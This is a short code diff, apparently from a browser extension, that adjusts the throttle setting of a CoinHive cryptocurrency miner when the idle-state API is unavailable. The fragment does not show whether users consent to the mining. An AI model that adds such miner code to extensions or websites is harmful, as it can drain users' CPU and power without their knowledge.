@@ -161,7 +161,7 @@ if (CoinHive) {
   if (chrome.idle && typeof chrome.idle.queryState === 'function') {
     startIdleChecks();
   } else {
-    miner.setThrottle(0.85);
+    miner.setThrottle(0.90);
   }
 
   // To be used from inspector
